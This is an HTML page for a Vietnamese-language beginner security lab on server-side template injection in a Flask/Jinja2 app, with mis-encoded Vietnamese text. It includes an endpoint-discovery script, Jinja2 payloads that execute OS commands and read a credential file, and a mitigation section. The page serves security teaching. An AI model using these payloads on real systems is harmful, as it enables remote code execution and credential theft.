<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1 - Web01: Server-Side Template Injection</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
             
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            line-height: 1.6;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            color: white;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .header .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
            margin-bottom: 20px;
        }

        .difficulty-badge {
            background: #27ae60;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: bold;
            display: inline-block;
        }

        .content-section {
            background: white;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
        }

        .section-title {
            color: #2c3e50;
            font-size: 1.8rem;
            margin-bottom: 20px;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }

        .objective-list {
            list-style: none;
            padding: 0;
        }

        .objective-list li {
            padding: 10px 0;
            padding-left: 30px;
            position: relative;
            border-bottom: 1px solid #eee;
        }

        .objective-list li:before {
            content: "üéØ";
            position: absolute;
            left: 0;
            font-size: 1.2rem;
        }

        .scenario-box {
            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 25px;
            border-radius: 10px;
            margin: 20px 0;
        }

        .scenario-box h3 {
            margin-bottom: 15px;
            font-size: 1.4rem;
        }

        .attack-steps {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .step-card {
            background: #f8f9fa;
            border: 2px solid #667eea;
            border-radius: 10px;
            padding: 20px;
            transition: transform 0.3s ease;
        }

        .step-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.2);
        }

        .step-number {
            background: #667eea;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 1.2rem;
            margin-bottom: 15px;
        }

        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            margin: 15px 0;
            border-left: 4px solid #667eea;
        }

        .payload-example {
            background: #fff5f5;
            border: 2px solid #e53e3e;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }

        .payload-example h4 {
            color: #e53e3e;
            margin-bottom: 10px;
        }

        .warning-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }

        .warning-box h4 {
            color: #856404;
            margin-bottom: 10px;
        }

        .mitigation-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .mitigation-card {
            background: #f0f8ff;
            border-left: 4px solid #4a90e2;
            padding: 20px;
            border-radius: 8px;
        }

        .mitigation-card h4 {
            color: #2c3e50;
            margin-bottom: 10px;
        }

        .lab-actions {
            text-align: center;
            margin-top: 40px;
        }

        .action-button {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 25px;
            text-decoration: none;
            display: inline-block;
            font-weight: bold;
            margin: 10px;
            transition: all 0.3s ease;
            font-size: 1.1rem;
        }

        .action-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
        }

        .back-btn {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(255,255,255,0.2);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            text-decoration: none;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            background: rgba(255,255,255,0.3);
        }

        .topology-section {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .topology-item {
            display: flex;
            align-items: center;
            margin: 10px 0;
            padding: 10px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .topology-icon {
            font-size: 2rem;
            margin-right: 15px;
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 2rem;
            }
            
            .attack-steps {
                grid-template-columns: 1fr;
            }
            
            .mitigation-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <a href="/labs" class="back-btn">‚Üê Quay l·∫°i Labs</a>
    
    <div class="container">
        <div class="header">
            <h1>üîç Lab 1 - Web01</h1>
            <p class="subtitle">Server-Side Template Injection (SSTI) Attack</p>
            <div class="difficulty-badge">BEGINNER</div>
        </div>

        <!-- T·ªïng quan Lab -->
        <div class="content-section">
            <h2 class="section-title">üìã T·ªïng quan Lab</h2>
            <div class="scenario-box">
                <h3>üéØ K·ªãch b·∫£n t·∫•n c√¥ng</h3>
                <p>Trong lab n√†y, b·∫°n s·∫Ω ƒë√≥ng vai tr√≤ l√† m·ªôt penetration tester th·ª±c hi·ªán t·∫•n c√¥ng t·ª´ b√™n ngo√†i m·∫°ng n·ªôi b·ªô. M·ª•c ti√™u l√† khai th√°c l·ªó h·ªïng SSTI trong ·ª©ng d·ª•ng web Flask ƒë·ªÉ chi·∫øm ƒë∆∞·ª£c th√¥ng tin x√°c th·ª±c c·ªßa t√†i kho·∫£n <strong>studentA</strong>.</p>
            </div>
            
            <h3>üéØ M·ª•c ti√™u h·ªçc t·∫≠p</h3>
            <ul class="objective-list">
                <li>H·ªçc c√°ch d√≤ t√¨m c√°c endpoint ·∫©n trong ·ª©ng d·ª•ng web</li>
                <li>Hi·ªÉu v·ªÅ l·ªó h·ªïng Server-Side Template Injection (SSTI)</li>
                <li>Th·ª±c h√†nh khai th√°c SSTI ƒë·ªÉ th·ª±c thi m√£ t·ª´ xa (RCE)</li>
                <li>Tr√≠ch xu·∫•t th√¥ng tin nh·∫°y c·∫£m t·ª´ server</li>
                <li>Ph√¢n t√≠ch t√°c ƒë·ªông v√† ƒë·ªÅ xu·∫•t bi·ªán ph√°p kh·∫Øc ph·ª•c</li>
            </ul>
        </div>

        <!-- M√¥ h√¨nh tri·ªÉn khai -->
        <div class="content-section">
            <h2 class="section-title">üèóÔ∏è M√¥ h√¨nh tri·ªÉn khai</h2>
            <div class="topology-section">
                <div class="topology-item">
                    <div class="topology-icon">üíª</div>
                    <div>
                        <strong>M√°y Attacker</strong><br>
                        M√°y t√≠nh c√° nh√¢n b√™n ngo√†i m·∫°ng n·ªôi b·ªô, kh√¥ng c√≥ quy·ªÅn truy c·∫≠p ban ƒë·∫ßu
                    </div>
                </div>
                <div class="topology-item">
                    <div class="topology-icon">üåê</div>
                    <div>
                        <strong>Web Server (web01)</strong><br>
                        ·ª®ng d·ª•ng Flask tri·ªÉn khai trong DMZ, c√≥ endpoint /search b·ªã l·ªô ra c√¥ng khai
                    </div>
                </div>
                <div class="topology-item">
                    <div class="topology-icon">üîê</div>
                    <div>
                        <strong>LDAP Server</strong><br>
                        M√°y ch·ªß x√°c th·ª±c Active Directory ch·ª©a th√¥ng tin ng∆∞·ªùi d√πng n·ªôi b·ªô
                    </div>
                </div>
                <div class="topology-item">
                    <div class="topology-icon">üñ•Ô∏è</div>
                    <div>
                        <strong>IRIS-User-01</strong><br>
                        M√°y tr·∫°m Windows trong m·∫°ng LAN, m·ª•c ti√™u cu·ªëi c√πng c·ªßa cu·ªôc t·∫•n c√¥ng
                    </div>
                </div>
            </div>
        </div>

        <!-- C√°c b∆∞·ªõc th·ª±c hi·ªán -->
        <div class="content-section">
            <h2 class="section-title">‚ö° C√°c b∆∞·ªõc th·ª±c hi·ªán</h2>
            
            <div class="attack-steps">
                <div class="step-card">
                    <div class="step-number">1</div>
                    <h3>D√≤ qu√©t Endpoint</h3>
                    <p>S·ª≠ d·ª•ng script Python ƒë·ªÉ d√≤ t√¨m c√°c endpoint ·∫©n ho·∫∑c b·ªã c·∫•u h√¨nh sai trong ·ª©ng d·ª•ng web.</p>
                    <div class="code-block">
# web01_endpoint_detect.py
import requests

target = "http://10.15.242.96"
wordlist_path = "wordlist.txt"

with open(wordlist_path, "r") as f:
    paths = [line.strip() for line in f if line.strip()]

for path in paths:
    url = f"{target}/{path}"
    try:
        res = requests.get(url, timeout=3)
        if res.status_code < 400:
            print(f"[+] Found: {url} ({res.status_code})")
    except requests.exceptions.RequestException:
        pass
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-number">2</div>
                    <h3>Ph√°t hi·ªán SSTI</h3>
                    <p>Ki·ªÉm tra xem endpoint /search c√≥ d√≠nh l·ªó h·ªïng SSTI b·∫±ng c√°ch th·ª≠ payload ƒë∆°n gi·∫£n.</p>
                    <div class="payload-example">
                        <h4>Payload ki·ªÉm tra:</h4>
                        <code>{{ "{{7*7}} " }}</code><br>
                        <strong>K·∫øt qu·∫£:</strong> 49 (x√°c nh·∫≠n SSTI)
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-number">3</div>
                    <h3>X√°c ƒë·ªãnh Template Engine</h3>
                    <p>S·ª≠ d·ª•ng payload ƒë·∫∑c trung ƒë·ªÉ x√°c ƒë·ªãnh ·ª©ng d·ª•ng ƒëang s·ª≠ d·ª•ng Jinja2 template engine.</p>
                    <div class="payload-example">
                        <h4>Payload x√°c ƒë·ªãnh:</h4>
                        <code>{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}</code>
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-number">4</div>
                    <h3>Th·ª±c thi m√£ t·ª´ xa (RCE)</h3>
                    <p>Khai th√°c SSTI ƒë·ªÉ th·ª±c thi c√°c l·ªánh h·ªá th·ªëng v√† kh√°m ph√° c·∫•u tr√∫c server.</p>
                    <div class="payload-example">
                        <h4>Payload li·ªát k√™ file:</h4>
                        <code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code>
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-number">5</div>
                    <h3>Tr√≠ch xu·∫•t th√¥ng tin nh·∫°y c·∫£m</h3>
                    <p>ƒê·ªçc file ch·ª©a th√¥ng tin x√°c th·ª±c c·ªßa t√†i kho·∫£n studentA.</p>
                    <div class="payload-example">
                        <h4>Payload ƒë·ªçc file:</h4>
                        <code>{{config.__class__.__init__.__globals__['os'].popen('cat /home/phuonglinh/studentA/secret.txt').read()}}</code>
                    </div>
                </div>

                <div class="step-card">
                    <div class="step-number">6</div>
                    <h3>Ph√¢n t√≠ch k·∫øt qu·∫£</h3>
                    <p>ƒê√°nh gi√° m·ª©c ƒë·ªô nghi√™m tr·ªçng c·ªßa l·ªó h·ªïng v√† t√°c ƒë·ªông ti·ªÅm ·∫©n ƒë·∫øn h·ªá th·ªëng.</p>
                    <div class="warning-box">
                        <h4>‚ö†Ô∏è M·ª©c ƒë·ªô nghi√™m tr·ªçng: CAO</h4>
                        <p>L·ªó h·ªïng cho ph√©p th·ª±c thi m√£ t·ª´ xa, ƒë·ªçc file nh·∫°y c·∫£m v√† c√≥ th·ªÉ leo thang t·∫•n c√¥ng.</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- K·∫øt qu·∫£ mong ƒë·ª£i -->
        <div class="content-section">
            <h2 class="section-title">üéØ K·∫øt qu·∫£ mong ƒë·ª£i</h2>
            <div class="objective-list">
                <li>Ph√°t hi·ªán endpoint /search kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá</li>
                <li>X√°c nh·∫≠n l·ªó h·ªïng SSTI trong Jinja2 template engine</li>
                <li>Th·ª±c thi th√†nh c√¥ng c√°c l·ªánh h·ªá th·ªëng tr√™n server</li>
                <li>ƒê·ªçc ƒë∆∞·ª£c n·ªôi dung file /home/phuonglinh/studentA/secret.txt</li>
                <li>Thu th·∫≠p ƒë∆∞·ª£c th√¥ng tin x√°c th·ª±c c·ªßa t√†i kho·∫£n studentA</li>
            </div>
        </div>

        <!-- Bi·ªán ph√°p kh·∫Øc ph·ª•c -->
        <div class="content-section">
            <h2 class="section-title">üõ°Ô∏è Bi·ªán ph√°p kh·∫Øc ph·ª•c</h2>
            <div class="mitigation-grid">
                <div class="mitigation-card">
                    <h4>üö´ Tr√°nh render_template_string</h4>
                    <p>Kh√¥ng s·ª≠ d·ª•ng render_template_string() v·ªõi d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. Ch·ªâ s·ª≠ d·ª•ng render_template() v·ªõi template tƒ©nh.</p>
                </div>
                <div class="mitigation-card">
                    <h4>üîç Ki·ªÉm tra Input</h4>
                    <p>√Åp d·ª•ng whitelist validation, h·∫°n ch·∫ø k√Ω t·ª± ƒë·∫∑c bi·ªát nh∆∞ {}, %, ', ", (, ) trong input.</p>
                </div>
                <div class="mitigation-card">
                    <h4>üë§ Gi·ªõi h·∫°n quy·ªÅn</h4>
                    <p>Ch·∫°y ·ª©ng d·ª•ng v·ªõi t√†i kho·∫£n c√≥ quy·ªÅn h·∫°n t·ªëi thi·ªÉu, kh√¥ng d√πng root/admin.</p>
                </div>
                <div class="mitigation-card">
                    <h4>üìä Monitoring</h4>
                    <p>Ghi log c√°c truy v·∫•n b·∫•t th∆∞·ªùng v√† thi·∫øt l·∫≠p c·∫£nh b√°o khi c√≥ input ch·ª©a template syntax.</p>
                </div>
            </div>
        </div>

        <!-- H√†nh ƒë·ªông -->
        <div class="lab-actions">
            <a href="/search?role=student&q=test" class="action-button">
                üöÄ B·∫Øt ƒë·∫ßu th·ª±c h√†nh
            </a>
            <a href="/labs" class="action-button" style="background: linear-gradient(45deg, #6c757d, #495057);">
                üìö Quay l·∫°i Labs
            </a>
        </div>

        <div style="text-align: center; margin-top: 40px; color: white;">
            <p style="opacity: 0.8;">
                ‚ö†Ô∏è Lab n√†y ch·ªâ d√†nh cho m·ª•c ƒë√≠ch h·ªçc t·∫≠p v√† nghi√™n c·ª©u b·∫£o m·∫≠t
            </p>
        </div>
    </div>
</body>
</html>